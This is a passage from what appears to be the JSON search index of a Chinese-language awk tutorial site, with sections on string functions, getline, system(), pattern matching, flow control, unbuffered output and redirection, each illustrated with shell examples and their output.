\u8f93\u51fa\u5b50\u4e32\u5728\u539f\u5b57\u7b26\u4e32\u4e2d\u7684\u4f4d\u7f6e [root@shell shelldoc]# awk '{print index($1,\"o\"),$1}' datafile 2 northwest 0 western 2 southwest 2 southern 2 southeast 0 eastern 2 northeast 0 western 2 north 0 central","title":"3\u3001\u67e5\u627e"},{"location":"programming_language/awk/awk_function/#4len","text":"length(\u5b57\u7b26\u4e32) \u2014\u2014 \u663e\u793a\u5b57\u7b26\u4e32\u7684\u957f\u5ea6 [root@shell shelldoc]# awk '{print length($1),$1}' datafile 9 northwest 7 western 9 southwest 8 southern 9 southeast 7 eastern 9 northeast 7 western 5 north 7 central","title":"4\u3001len"},{"location":"programming_language/awk/awk_function/#5split","text":"[root@iZbp1ealzv6zqhd71bns8sZ ~]# cat 1.txt a:9:0 b c d e f g:0:p h i j k l [root@iZbp1ealzv6zqhd71bns8sZ ~]# awk '{z=split($1,array,\":\");for(i=1;i<=z;i++){print i,array[i]}}' 1.txt 1 a 2 9 3 0 1 g 2 0 3 p","title":"5\u3001split"},{"location":"programming_language/awk/awk_function/#6","text":"","title":"6\u3001\u5176\u4ed6\u90e8\u5206\u51fd\u6570"},{"location":"programming_language/awk/awk_function/#7","text":"rand() \u6bcf\u6b21\u4f7f\u7528\u7684\u65f6\u5019 \u5fc5\u987b\u8c03\u7528srand()\u51fd\u6570\uff0crand()\u624d\u4f1a\u968f\u673a\uff0c\u4e0d\u7136\u5c31\u4e00\u76f4\u90fd\u662f\u4e00\u4e2a [root@iZbp1ealzv6zqhd71bns8sZ ~]# awk 'END{print srand(),rand()}' 1.txt 1 0.024876 [root@iZbp1ealzv6zqhd71bns8sZ ~]# awk 'END{print srand(),rand()}' 1.txt 1 0.024876 [root@iZbp1ealzv6zqhd71bns8sZ ~]# awk 'END{print srand(),rand()}' 1.txt 1 0.732423 \u4e0d\u8c03\u7528srand [root@iZbp1ealzv6zqhd71bns8sZ ~]# awk 'END{print rand()}' 1.txt 0.237788 [root@iZbp1ealzv6zqhd71bns8sZ ~]# awk 'END{print rand()}' 1.txt 0.237788 [root@iZbp1ealzv6zqhd71bns8sZ ~]# awk 'END{print rand()}' 1.txt 0.237788","title":"7\u3001\u968f\u673a\u51fd\u6570"},{"location":"programming_language/awk/awk_function/#8getline","text":"\u5f53getline\u5927\u4e8e0\u4ee3\u8868\u8bfb\u53d6\u5230\u4e86\u4e0b\u4e00\u884c [root@iZbp1ealzv6zqhd71bns8sZ ~]# cat 1.txt a:9:0 b c d e f g:0:p h i j k l [root@iZbp1ealzv6zqhd71bns8sZ ~]# awk '/g:0:p/{if(getline>0){print \"have\"}else{print \"GG\"}}' 1.txt GG","title":"8\u3001getline\u51fd\u6570"},{"location":"programming_language/awk/awk_function/#9system","text":"\u200b \u53ef\u4ee5\u6267\u884c\u4e00\u4e2a\u7cfb\u7edf\u547d\u4ee4 [root@iZbp1ealzv6zqhd71bns8sZ ~]# awk 'BEGIN{if(system(\"mkdir dale\")!=0){print \"faile\"}else{print \"ok\"}}' 1.txt ok [root@iZbp1ealzv6zqhd71bns8sZ ~]# awk 'BEGIN{if(system(\"mkdir dale\")!=0){print \"faile\"}else{print \"ok\"}}' 1.txt mkdir: cannot create directory \u2018dale\u2019: File exists faile","title":"9\u3001system()\u51fd\u6570"},{"location":"programming_language/awk/awk_function/#10","text":"","title":"10\u3001\u65f6\u95f4\u51fd\u6570"},{"location":"programming_language/awk/awk_function/#_2","text":"\u683c\u5f0f function \u51fd\u6570\u540d(\u53c2\u65701\uff0c\u53c2\u65702\uff0c... ... \uff0c\u53c2\u6570n) { \u51fd\u6570\u4f53 return value //\u8fd4\u56de\u503c } //\u53c2\u6570\u4e5f\u662f\u53ef\u6709\u53ef\u65e0\u7684 [root@shell shelldoc]# awk 'function hello(){print \"shell is over\"}{hello()}' pass","title":"\u4e8c\u3001\u81ea\u5b9a\u4e49\u51fd\u6570"},{"location":"programming_language/awk/awk_matching/","text":"awk\u4e2d\u7684\u5339\u914d (1)\u6a21\u7cca\u5339\u914d 1)\u4f7f\u7528if {if($1~/zhengxh/) print $0} 2)\u4e0d\u7528if '$0 ~ /zhengxh/' awk '$0~/zhengxh/' filename \u6216 awk '{if($0~/zhengxh/) print $0} filename #\u8f93\u51fa\u542b\u6709zhengxh\u7684\u884c \u6216 awk '/zhengxh/' filename (2)\u7cbe\u786e\u5339\u914d $n==\"chars\" awk '$1==\"zhengxh\" {print $0}' filename #\u8f93\u51fa\u7b2c\u4e00\u5217\u7b49\u4e8ezhengxh\u7684\u884c (3)\u53cd\u5411\u5339\u914d $n !~ /adf/ awk '$1 !~ /zhengxh/ {print $0}' filename #\u8f93\u51fa\u7b2c\u4e00\u5217\u4e0d\u662fzhengxh\u7684\u884c (4)\u5927\u5c0f\u5199\u5339\u914d awk '/[zZ]hengxh/' filename #\u5339\u914d\u542b\u6709zhengxh \u6216\u662fZhengxh\u7684\u5b57\u7b26\u4e32 (5)\u4f7f\u7528\u6216\u8fd0\u7b97 awk '$0 ~ /(zhengxh|hover)/' filename #\u67e5\u627e\u542b\u6709zhengxh\u6216hover\u5b57\u4e32\u7684\u884c \u6216 awk '{if($0~/zhengxh/ OR $0~/hover/) print $0}' filename pidstat | awk '{if($9~/1/ || $9~/2/)print $0}","title":"\u5339\u914d"},{"location":"programming_language/awk/awk_matching/#awk","text":"","title":"awk\u4e2d\u7684\u5339\u914d"},{"location":"programming_language/awk/awk_matching/#1","text":"1)\u4f7f\u7528if {if($1~/zhengxh/) print $0} 2)\u4e0d\u7528if '$0 ~ /zhengxh/' awk '$0~/zhengxh/' filename \u6216 awk '{if($0~/zhengxh/) print $0} filename #\u8f93\u51fa\u542b\u6709zhengxh\u7684\u884c \u6216 awk '/zhengxh/' filename","title":"(1)\u6a21\u7cca\u5339\u914d"},{"location":"programming_language/awk/awk_matching/#2","text":"$n==\"chars\" awk '$1==\"zhengxh\" {print $0}' filename #\u8f93\u51fa\u7b2c\u4e00\u5217\u7b49\u4e8ezhengxh\u7684\u884c","title":"(2)\u7cbe\u786e\u5339\u914d"},{"location":"programming_language/awk/awk_matching/#3","text":"$n !~ /adf/ awk '$1 !~ /zhengxh/ {print $0}' filename #\u8f93\u51fa\u7b2c\u4e00\u5217\u4e0d\u662fzhengxh\u7684\u884c","title":"(3)\u53cd\u5411\u5339\u914d"},{"location":"programming_language/awk/awk_matching/#4","text":"awk '/[zZ]hengxh/' filename #\u5339\u914d\u542b\u6709zhengxh \u6216\u662fZhengxh\u7684\u5b57\u7b26\u4e32","title":"(4)\u5927\u5c0f\u5199\u5339\u914d"},{"location":"programming_language/awk/awk_matching/#5","text":"awk '$0 ~ /(zhengxh|hover)/' filename #\u67e5\u627e\u542b\u6709zhengxh\u6216hover\u5b57\u4e32\u7684\u884c \u6216 awk '{if($0~/zhengxh/ OR $0~/hover/) print $0}' filename pidstat | awk '{if($9~/1/ || $9~/2/)print $0}","title":"(5)\u4f7f\u7528\u6216\u8fd0\u7b97"},{"location":"programming_language/awk/awk_nocache/","text":"awk\u65e0\u7f13\u5b58\u8f93\u51fa tail -f test.log | grep \"mode\" | awk '{print $5}' \u6216\u8005 tail -f test.log | awk '/mode/ {print $5}' \u7684\u65f6\u5019\uff0c\u5982\u679ctest.log\u4e2d\u6ee1\u8db3\u6a21\u5f0fmode\u7684\u6570\u636e\u5f88\u5c11\uff0c\u4f1a\u53d1\u73b0\u5373\u4fbf\u662ftest.log\u4e2d\u65b0\u51fa\u73b0\u4e86\u6ee1\u8db3mode\u7684\u884c\uff0c\u4f46\u662f\u4e0a\u9762\u4e24\u4e2a\u547d\u4ee4\u90fd\u6ca1\u6709\u4efb\u4f55\u8f93\u51fa\u3002 \u539f\u56e0\u5728\u4e8egrep\u548cawk\u5904\u4e8e\u6548\u7387\u7684\u8003\u91cf\uff0c\u4f1a\u7f13\u5b58\u4e00\u6279\u6570\u636e\u518d\u8f93\u51fa\u5230\u6807\u51c6\u8f93\u51fa\u3002 grep\u7684--line-buffered\u9009\u9879\u548cawk\u7684fflush(stdout)\u547d\u4ee4\u53ef\u4ee5\u4f7f\u5f97grep\u548cawk\u4e0d\u7f13\u5b58\u6570\u636e\u3002\u5982\uff1a tail -f test.log | grep --line-buffered \"mode\" | awk '{print $5}' tail -f test.log | awk '/mode/ {print $5,$6; fflush(stdout)}''","title":"awk\u65e0\u7f13\u5b58\u8f93\u51fa"},{"location":"programming_language/awk/awk_nocache/#awk","text":"tail -f test.log | grep \"mode\" | awk '{print $5}' \u6216\u8005 tail -f test.log | awk '/mode/ {print $5}' \u7684\u65f6\u5019\uff0c\u5982\u679ctest.log\u4e2d\u6ee1\u8db3\u6a21\u5f0fmode\u7684\u6570\u636e\u5f88\u5c11\uff0c\u4f1a\u53d1\u73b0\u5373\u4fbf\u662ftest.log\u4e2d\u65b0\u51fa\u73b0\u4e86\u6ee1\u8db3mode\u7684\u884c\uff0c\u4f46\u662f\u4e0a\u9762\u4e24\u4e2a\u547d\u4ee4\u90fd\u6ca1\u6709\u4efb\u4f55\u8f93\u51fa\u3002 \u539f\u56e0\u5728\u4e8egrep\u548cawk\u5904\u4e8e\u6548\u7387\u7684\u8003\u91cf\uff0c\u4f1a\u7f13\u5b58\u4e00\u6279\u6570\u636e\u518d\u8f93\u51fa\u5230\u6807\u51c6\u8f93\u51fa\u3002 grep\u7684--line-buffered\u9009\u9879\u548cawk\u7684fflush(stdout)\u547d\u4ee4\u53ef\u4ee5\u4f7f\u5f97grep\u548cawk\u4e0d\u7f13\u5b58\u6570\u636e\u3002\u5982\uff1a tail -f test.log | grep --line-buffered \"mode\" | awk '{print $5}' tail -f test.log | awk '/mode/ {print $5,$6; fflush(stdout)}''","title":"awk\u65e0\u7f13\u5b58\u8f93\u51fa"},{"location":"programming_language/awk/awk_noprint/","text":"awk \u4e0d\u6253\u5370\u67d0\u4e00\u5217\u7684\u8f93\u51fa \u6bd4\u5982\u4e00\u4e2aa\u6587\u4ef6\uff0c\u5185\u5bb9\u5982\u4e0b\uff0c\u73b0\u5728\u8981\u5b9e\u73b0\u4e0d\u6253\u5370\u6700\u540e\u4e00\u5217\u3002 [root@localhost ~]# cat a a b c [root@localhost ~]# cat a | awk '{print $NF}' c # \u901a\u8fc7\u8bbe\u7f6e\u6700\u540e\u4e00\u5217\u4e3a\u7a7a [root@localhost ~]# cat a | awk '{$NF=\"\";print$0}' a b # $0 \u662f\u6253\u5370\u6240\u6709\u5217 \uff08\u6570\u5b57\u96f6\uff09 [root@localhost ~]# cat a | awk '{print $0}' a b c # \u6392\u9664\u591a\u5217 [root@localhost ~]# cat a | awk '{$2=\"\";$NF=\"\";print$0}' a [root@localhost ~]# cat a | awk '{$2=\"\";print$0}' a c # \u6392\u9664\u591a\u5217\u53e6\u4e00\u79cd\u5199\u6cd5 \uff08\u7b49\u4e8e\u591a\u6b21\u53d8\u91cf\u8d4b\u503c\uff09 [root@localhost ~]# cat a | awk '{$2=$NF=\"\";print$0}' a \u4e0a\u9762\u53ef\u4ee5\u770b\u5230\u6392\u9664\u7684\u90a3\u5217\u53d8\u4e3a\u4e86\u4e00\u5217\u7a7a\u5217\uff0c\u518d\u7528tr\uff08tr\u662ftranslate\u7f29\u5199\uff09\u53bb\u9664\u7a7a\u5217\uff1a [root@localhost ~]# cat a | awk '{$2=\"\";print$0}' a c # \u4e2d\u95f4\u6709\u7a7a\u5217 [root@localhost ~]# cat a | awk '{$2=\"\";print$0}' | tr -s ' ' ' ' a c # \u6392\u9664\u4e86\u7a7a\u5217 tr -s\u53c2\u6570\u610f\u601d\u662f\u5982\u679c\u6709\u591a\u4e2a\u8fde\u7eed\u76f8\u7684\u540c\u5b57\u7b26\u5c31\u5408\u5e76\u4e3a1\u4e2a\u3002 \u8f6c\u81ea https://www.rootop.org/pages/4470.html","title":"awk\u4e0d\u6253\u5370\u67d0\u5217"},{"location":"programming_language/awk/awk_noprint/#awk","text":"\u6bd4\u5982\u4e00\u4e2aa\u6587\u4ef6\uff0c\u5185\u5bb9\u5982\u4e0b\uff0c\u73b0\u5728\u8981\u5b9e\u73b0\u4e0d\u6253\u5370\u6700\u540e\u4e00\u5217\u3002 [root@localhost ~]# cat a a b c [root@localhost ~]# cat a | awk '{print $NF}' c # \u901a\u8fc7\u8bbe\u7f6e\u6700\u540e\u4e00\u5217\u4e3a\u7a7a [root@localhost ~]# cat a | awk '{$NF=\"\";print$0}' a b # $0 \u662f\u6253\u5370\u6240\u6709\u5217 \uff08\u6570\u5b57\u96f6\uff09 [root@localhost ~]# cat a | awk '{print $0}' a b c # \u6392\u9664\u591a\u5217 [root@localhost ~]# cat a | awk '{$2=\"\";$NF=\"\";print$0}' a [root@localhost ~]# cat a | awk '{$2=\"\";print$0}' a c # \u6392\u9664\u591a\u5217\u53e6\u4e00\u79cd\u5199\u6cd5 \uff08\u7b49\u4e8e\u591a\u6b21\u53d8\u91cf\u8d4b\u503c\uff09 [root@localhost ~]# cat a | awk '{$2=$NF=\"\";print$0}' a \u4e0a\u9762\u53ef\u4ee5\u770b\u5230\u6392\u9664\u7684\u90a3\u5217\u53d8\u4e3a\u4e86\u4e00\u5217\u7a7a\u5217\uff0c\u518d\u7528tr\uff08tr\u662ftranslate\u7f29\u5199\uff09\u53bb\u9664\u7a7a\u5217\uff1a [root@localhost ~]# cat a | awk '{$2=\"\";print$0}' a c # \u4e2d\u95f4\u6709\u7a7a\u5217 [root@localhost ~]# cat a | awk '{$2=\"\";print$0}' | tr -s ' ' ' ' a c # \u6392\u9664\u4e86\u7a7a\u5217 tr -s\u53c2\u6570\u610f\u601d\u662f\u5982\u679c\u6709\u591a\u4e2a\u8fde\u7eed\u76f8\u7684\u540c\u5b57\u7b26\u5c31\u5408\u5e76\u4e3a1\u4e2a\u3002 \u8f6c\u81ea https://www.rootop.org/pages/4470.html","title":"awk \u4e0d\u6253\u5370\u67d0\u4e00\u5217\u7684\u8f93\u51fa"},{"location":"programming_language/awk/awk_process_control/","text":"Awk\u7684\u6d41\u7a0b\u63a7\u5236 \u4e00\u3001\u4e09\u5143\u64cd\u4f5c\u7b26 \uff1f: \u5224\u65ad\u6761\u4ef6?\u8f93\u51fa\u7ed3\u679c1:\u8f93\u51fa\u7ed3\u679c2 \u5982\u679c\u6761\u4ef6\u4e3a\u771f\uff0c\u8f93\u51fa\u95ee\u53f7\u540e\u9762\u7684\u7ed3\u679c\uff0c\u5426\u5219\u8f93\u51fa\u5192\u53f7\u540e\u9762\u7684\u7ed3\u679c [root@shell shelldoc]# awk -F: '{print $1\":\"($3>$4?\"uid:\"$3:\"gid:\"$4)}' pass \u4e8c\u3001\u5206\u652f\u5224\u65ad\u7ed3\u6784 if 1\u3001\u8bed\u6cd5\u683c\u5f0f\uff1a if(\u6761\u4ef6\u8868\u8fbe\u5f0f) { \u52a8\u4f5c } else { \u52a8\u4f5c } [root@shell shelldoc]# if1.awk BEGIN{ FS=\":\" } { if($3>$4) { print $1\":uid:\"$3 } else { print $1\":gid:\"$4 } } [root@shell shelldoc]# awk -f if1.awk pass 2\u3001\u591a\u5206\u652f\u5224\u65ad\u8bed\u6cd5\u7ed3\u6784 if(\u6761\u4ef6\u8868\u8fbe\u5f0f) { \u52a8\u4f5c } else if(\u6761\u4ef6\u8868\u8fbe\u5f0f) { \u52a8\u4f5c } ... ... else { \u52a8\u4f5c } [root@shell shelldoc]# cat score mike 83 rose 60 john 99 larry 65 [root@shell shelldoc]# cat if2.awk #!/bin/awk -f //shabang\uff0c\u6307\u5b9a\u6587\u4ef6\u4e2d\u7684\u547d\u4ee4\u7684\u89e3\u6790\u73af\u5883\u662fawk NR>0{ if($2>=90) { print $1\": A\" } else if($2>=80) { print $1\": B\" } else { print $1\": C\" } } [root@shell shelldoc]# chmod +x if2.awk [root@shell shelldoc]# ./if2.awk score mike: B rose: C john: A larry: C \u4e09\u3001\u5faa\u73af \u529f\u80fd\uff1a 1\uff09\u4ece\u884c\u4e2d\u53d6\u51fa\u6bcf\u4e2a\u5b57\u6bb5\uff0c\u4e3b\u8981\u7528\u4e8e\u5faa\u73af\u5b57\u6bb5 2\uff09\u904d\u5386\u6570\u7ec4\u5143\u7d20 1\u3001while\u5faa\u73af \u8bed\u6cd5\uff1a \u53d8\u91cf\u521d\u59cb\u503c while \uff08\u6761\u4ef6\uff09 { \u52a8\u4f5c \u53d8\u91cf\u7684\u66f4\u65b0 } [root@shell shelldoc]# cat score mike 85 80 90 [root@shell shelldoc]# while1.awk /mike/{ i=1 while(i<=NF) { print $i i++ } } [root@shell shelldoc]# awk -f while1.awk score mike 85 80 90 2\u3001do\u5faa\u73af \u200b 3\u3001for\u5faa\u73af \u8bed\u6cd5\uff1a for(\u53d8\u91cf\u521d\u59cb\u503c;\u5224\u65ad\u6761\u4ef6;\u53d8\u91cf\u7684\u66f4\u65b0) { \u52a8\u4f5c } [root@shell shelldoc]# for1.awk /mike/{ for(i=1;i<=NF;i++) { print $i } } \u7edf\u8ba1\u5355\u8bcd\u7684\u6b21\u6570 awk '{for(i=1;i<=NF;i++){print $i}}' | sort | uniq -c \u56db\u3001\u5224\u65ad\u52a0\u5faa\u73af \u4f8b\u5b50\uff1a \u8f93\u51fa\u6bcf\u884c\u7684\u6700\u5927\u503c [root@shell shelldoc]# cat number 90 10 70 70 49 33 22 82 91 88 100 33 [root@shell shelldoc]# if-for.awk { max=$1 for (i=1;i<=NF;i++) { if($i>max) { max=$i } } print max } [root@shell shelldoc]# awk -f if-for.awk number 90 70 91 100 \u4e94\u3001\u53cc\u91cd\u5faa\u73af (\u5d4c\u5957\u5faa\u73af) \u6253\u537099\u4e58\u6cd5\u53e3\u8bc0\u8868 [root@shell shelldoc]# for-for.awk BEGIN{ for(i=1;i<=9;i++) { for(j=1;j<=i;j++) { printf j\"*\"i\"=\"i*j\"\\t\" } printf \"\\n\" } } [root@shell shelldoc]# awk -f for-for.awk 1*1=1 1*2=2 2*2=4 1*3=3 2*3=6 3*3=9 1*4=4 2*4=8 3*4=12 4*4=16 1*5=5 2*5=10 3*5=15 4*5=20 5*5=25 1*6=6 2*6=12 3*6=18 4*6=24 5*6=30 6*6=36 1*7=7 2*7=14 3*7=21 4*7=28 5*7=35 6*7=42 7*7=49 1*8=8 2*8=16 3*8=24 4*8=32 5*8=40 6*8=48 7*8=56 8*8=64 1*9=9 2*9=18 3*9=27 4*9=36 5*9=45 6*9=54 7*9=63 8*9=72 9*9=81 \u516d\u3001\u5faa\u73af\u63a7\u5236\u8bed\u53e5 continue \u8df3\u51fa\u672c\u6b21\u5faa\u73af [root@shell shelldoc]# cat for-for.awk BEGIN{ for(i=1;i<=9;i++) { for(j=1;j<=i;j++) { if (j==4) {continue} else { printf j\"* \"i\"=\"i*j\"\\t\" } } printf \"\\n\" } } break \u8df3\u51fa\u5f53\u524d\u5faa\u73af [root@shell shelldoc]# cat for-for.awk BEGIN{ for(i=1;i<=9;i++) { for(j=1;j<=i;j++) { if (j==4) {break} else { printf j\"*\"i\"=\"i*j\"\\t\" } } printf \"\\n\" } } exit \u9000\u51fa\u811a\u672c [root@shell shelldoc]# cat for-for.awk BEGIN{ for(i=1;i<=9;i++) { for(j=1;j<=i;j++) { if (j==4) {exit} else { printf j\"*\"i\"=\"i*j\"\\t\" } } printf \"\\n\" } } next \u8df3\u8fc7\u672c\u884c\uff0c\u8bfb\u53d6\u4e0b\u4e00\u884c [root@shell shelldoc]# awk '/name/{next};{print $0}' score \u200b","title":"\u5faa\u73af\u63a7\u5236"},{"location":"programming_language/awk/awk_process_control/#awk","text":"","title":"Awk\u7684\u6d41\u7a0b\u63a7\u5236"},{"location":"programming_language/awk/awk_process_control/#_1","text":"\uff1f: \u5224\u65ad\u6761\u4ef6?\u8f93\u51fa\u7ed3\u679c1:\u8f93\u51fa\u7ed3\u679c2 \u5982\u679c\u6761\u4ef6\u4e3a\u771f\uff0c\u8f93\u51fa\u95ee\u53f7\u540e\u9762\u7684\u7ed3\u679c\uff0c\u5426\u5219\u8f93\u51fa\u5192\u53f7\u540e\u9762\u7684\u7ed3\u679c [root@shell shelldoc]# awk -F: '{print $1\":\"($3>$4?\"uid:\"$3:\"gid:\"$4)}' pass","title":"\u4e00\u3001\u4e09\u5143\u64cd\u4f5c\u7b26"},{"location":"programming_language/awk/awk_process_control/#_2","text":"","title":"\u4e8c\u3001\u5206\u652f\u5224\u65ad\u7ed3\u6784"},{"location":"programming_language/awk/awk_process_control/#if","text":"","title":"if"},{"location":"programming_language/awk/awk_process_control/#1","text":"if(\u6761\u4ef6\u8868\u8fbe\u5f0f) { \u52a8\u4f5c } else { \u52a8\u4f5c } [root@shell shelldoc]# if1.awk BEGIN{ FS=\":\" } { if($3>$4) { print $1\":uid:\"$3 } else { print $1\":gid:\"$4 } } [root@shell shelldoc]# awk -f if1.awk pass","title":"1\u3001\u8bed\u6cd5\u683c\u5f0f\uff1a"},{"location":"programming_language/awk/awk_process_control/#2","text":"if(\u6761\u4ef6\u8868\u8fbe\u5f0f) { \u52a8\u4f5c } else if(\u6761\u4ef6\u8868\u8fbe\u5f0f) { \u52a8\u4f5c } ... ... else { \u52a8\u4f5c } [root@shell shelldoc]# cat score mike 83 rose 60 john 99 larry 65 [root@shell shelldoc]# cat if2.awk #!/bin/awk -f //shabang\uff0c\u6307\u5b9a\u6587\u4ef6\u4e2d\u7684\u547d\u4ee4\u7684\u89e3\u6790\u73af\u5883\u662fawk NR>0{ if($2>=90) { print $1\": A\" } else if($2>=80) { print $1\": B\" } else { print $1\": C\" } } [root@shell shelldoc]# chmod +x if2.awk [root@shell shelldoc]# ./if2.awk score mike: B rose: C john: A larry: C","title":"2\u3001\u591a\u5206\u652f\u5224\u65ad\u8bed\u6cd5\u7ed3\u6784"},{"location":"programming_language/awk/awk_process_control/#_3","text":"\u529f\u80fd\uff1a 1\uff09\u4ece\u884c\u4e2d\u53d6\u51fa\u6bcf\u4e2a\u5b57\u6bb5\uff0c\u4e3b\u8981\u7528\u4e8e\u5faa\u73af\u5b57\u6bb5 2\uff09\u904d\u5386\u6570\u7ec4\u5143\u7d20","title":"\u4e09\u3001\u5faa\u73af"},{"location":"programming_language/awk/awk_process_control/#1while","text":"\u8bed\u6cd5\uff1a \u53d8\u91cf\u521d\u59cb\u503c while \uff08\u6761\u4ef6\uff09 { \u52a8\u4f5c \u53d8\u91cf\u7684\u66f4\u65b0 } [root@shell shelldoc]# cat score mike 85 80 90 [root@shell shelldoc]# while1.awk /mike/{ i=1 while(i<=NF) { print $i i++ } } [root@shell shelldoc]# awk -f while1.awk score mike 85 80 90","title":"1\u3001while\u5faa\u73af"},{"location":"programming_language/awk/awk_process_control/#2do","text":"\u200b","title":"2\u3001do\u5faa\u73af"},{"location":"programming_language/awk/awk_process_control/#3for","text":"\u8bed\u6cd5\uff1a for(\u53d8\u91cf\u521d\u59cb\u503c;\u5224\u65ad\u6761\u4ef6;\u53d8\u91cf\u7684\u66f4\u65b0) { \u52a8\u4f5c } [root@shell shelldoc]# for1.awk /mike/{ for(i=1;i<=NF;i++) { print $i } } \u7edf\u8ba1\u5355\u8bcd\u7684\u6b21\u6570 awk '{for(i=1;i<=NF;i++){print $i}}' | sort | uniq -c","title":"3\u3001for\u5faa\u73af"},{"location":"programming_language/awk/awk_process_control/#_4","text":"\u4f8b\u5b50\uff1a \u8f93\u51fa\u6bcf\u884c\u7684\u6700\u5927\u503c [root@shell shelldoc]# cat number 90 10 70 70 49 33 22 82 91 88 100 33 [root@shell shelldoc]# if-for.awk { max=$1 for (i=1;i<=NF;i++) { if($i>max) { max=$i } } print max } [root@shell shelldoc]# awk -f if-for.awk number 90 70 91 100","title":"\u56db\u3001\u5224\u65ad\u52a0\u5faa\u73af"},{"location":"programming_language/awk/awk_process_control/#_5","text":"\u6253\u537099\u4e58\u6cd5\u53e3\u8bc0\u8868 [root@shell shelldoc]# for-for.awk BEGIN{ for(i=1;i<=9;i++) { for(j=1;j<=i;j++) { printf j\"*\"i\"=\"i*j\"\\t\" } printf \"\\n\" } } [root@shell shelldoc]# awk -f for-for.awk 1*1=1 1*2=2 2*2=4 1*3=3 2*3=6 3*3=9 1*4=4 2*4=8 3*4=12 4*4=16 1*5=5 2*5=10 3*5=15 4*5=20 5*5=25 1*6=6 2*6=12 3*6=18 4*6=24 5*6=30 6*6=36 1*7=7 2*7=14 3*7=21 4*7=28 5*7=35 6*7=42 7*7=49 1*8=8 2*8=16 3*8=24 4*8=32 5*8=40 6*8=48 7*8=56 8*8=64 1*9=9 2*9=18 3*9=27 4*9=36 5*9=45 6*9=54 7*9=63 8*9=72 9*9=81","title":"\u4e94\u3001\u53cc\u91cd\u5faa\u73af   (\u5d4c\u5957\u5faa\u73af)"},{"location":"programming_language/awk/awk_process_control/#_6","text":"","title":"\u516d\u3001\u5faa\u73af\u63a7\u5236\u8bed\u53e5"},{"location":"programming_language/awk/awk_process_control/#continue","text":"[root@shell shelldoc]# cat for-for.awk BEGIN{ for(i=1;i<=9;i++) { for(j=1;j<=i;j++) { if (j==4) {continue} else { printf j\"* \"i\"=\"i*j\"\\t\" } } printf \"\\n\" } }","title":"continue        \u8df3\u51fa\u672c\u6b21\u5faa\u73af"},{"location":"programming_language/awk/awk_process_control/#break","text":"[root@shell shelldoc]# cat for-for.awk BEGIN{ for(i=1;i<=9;i++) { for(j=1;j<=i;j++) { if (j==4) {break} else { printf j\"*\"i\"=\"i*j\"\\t\" } } printf \"\\n\" } }","title":"break       \u8df3\u51fa\u5f53\u524d\u5faa\u73af"},{"location":"programming_language/awk/awk_process_control/#exit","text":"[root@shell shelldoc]# cat for-for.awk BEGIN{ for(i=1;i<=9;i++) { for(j=1;j<=i;j++) { if (j==4) {exit} else { printf j\"*\"i\"=\"i*j\"\\t\" } } printf \"\\n\" } }","title":"exit        \u9000\u51fa\u811a\u672c"},{"location":"programming_language/awk/awk_process_control/#next","text":"[root@shell shelldoc]# awk '/name/{next};{print $0}' score \u200b","title":"next        \u8df3\u8fc7\u672c\u884c\uff0c\u8bfb\u53d6\u4e0b\u4e00\u884c"},{"location":"programming_language/awk/awk_redirect/","text":"1\u3001awk\u4e0e\u91cd\u5b9a\u5411 \u8f93\u51fa\u91cd\u5b9a\u5411 \u5c06uid>100\u7684\u7528\u6237\u540d\u53cauid\u4fdd\u5b58\u5230/tmp/uidup100\u6587\u4ef6\u4e2d [root@shell shelldoc]# awk -F: '$3 > 100{print $1,$3 > \"/tmp/uidup100\"}' /etc/passwd \u8f93\u5165\u91cd\u5b9a\u5411 getline \u63a5\u6536\u6765\u81ea\u4e8e\u6807\u51c6\u8f93\u5165\u3001\u7ba1\u9053\u548c\u6587\u4ef6\uff08\u975e\u5f53\u524d\u5904\u7406\u6587\u4ef6\uff09\u7684\u6570\u636e\uff0c\u5b58\u5165\u5230\u4e00\u4e2a\u53d8\u91cf\u4e2d\uff0c\u518d\u7ed9awk\u4f7f\u7528 [root@shell shelldoc]# awk 'BEGIN{\"date\" | getline a}{print $0}END{print a}' pass [root@shell shelldoc]# tty \u4ece\u6807\u51c6\u8f93\u5165\u8bfb\u53d6\u4e00\u4e2a\u6570\u636e \u4f20\u7ed9\u53d8\u91cfusername\uff0c\u5224\u65adpasswd\u6587\u4ef6\u4e2d\u662f\u5426\u6709\u8fd9\u6837\u7684\u7528\u6237\u540d\uff0c\u5982\u679c\u6709\uff0c\u6253\u5370\u884c\u53f7\u548c\u7528\u6237\u540d [root@shell shelldoc]# sc2.awk BEGIN{ FS=\":\" printf \"\u8bf7\u8f93\u5165\u4e00\u4e2a\u7528\u6237\u540d\uff1a \" getline username < \"/dev/pts/10\" } { if($1==username) \u5224\u65ad { print NR,$1 } } [root@shell shelldoc]# awk -f sc2.awk /etc/passwd \u8bf7\u8f93\u5165\u4e00\u4e2a\u7528\u6237\u540d\uff1a root 1 root 2\u3001awk\u4e0e\u7ba1\u9053 [root@shell shelldoc]# awk -F: '$3 > 100{print $1,$3 | \"sort -nr -k2\"}' /etc/passwd 3\u3001\u4f7f\u7528awk\u6267\u884c\u7cfb\u7edf\u547d\u4ee4 [root@shell shelldoc]# awk 'BEGIN{print \"today is \";system(\"date\")}' today is Mon Sep 7 12:26:03 CST 2015","title":"\u91cd\u5b9a\u5411"},{"location":"programming_language/awk/awk_redirect/#1awk","text":"","title":"1\u3001awk\u4e0e\u91cd\u5b9a\u5411"},{"location":"programming_language/awk/awk_redirect/#_1","text":"\u5c06uid>100\u7684\u7528\u6237\u540d\u53cauid\u4fdd\u5b58\u5230/tmp/uidup100\u6587\u4ef6\u4e2d [root@shell shelldoc]# awk -F: '$3 > 100{print $1,$3 > \"/tmp/uidup100\"}' /etc/passwd","title":"\u8f93\u51fa\u91cd\u5b9a\u5411"},{"location":"programming_language/awk/awk_redirect/#_2","text":"getline \u63a5\u6536\u6765\u81ea\u4e8e\u6807\u51c6\u8f93\u5165\u3001\u7ba1\u9053\u548c\u6587\u4ef6\uff08\u975e\u5f53\u524d\u5904\u7406\u6587\u4ef6\uff09\u7684\u6570\u636e\uff0c\u5b58\u5165\u5230\u4e00\u4e2a\u53d8\u91cf\u4e2d\uff0c\u518d\u7ed9awk\u4f7f\u7528 [root@shell shelldoc]# awk 'BEGIN{\"date\" | getline a}{print $0}END{print a}' pass [root@shell shelldoc]# tty \u4ece\u6807\u51c6\u8f93\u5165\u8bfb\u53d6\u4e00\u4e2a\u6570\u636e \u4f20\u7ed9\u53d8\u91cfusername\uff0c\u5224\u65adpasswd\u6587\u4ef6\u4e2d\u662f\u5426\u6709\u8fd9\u6837\u7684\u7528\u6237\u540d\uff0c\u5982\u679c\u6709\uff0c\u6253\u5370\u884c\u53f7\u548c\u7528\u6237\u540d [root@shell shelldoc]# sc2.awk 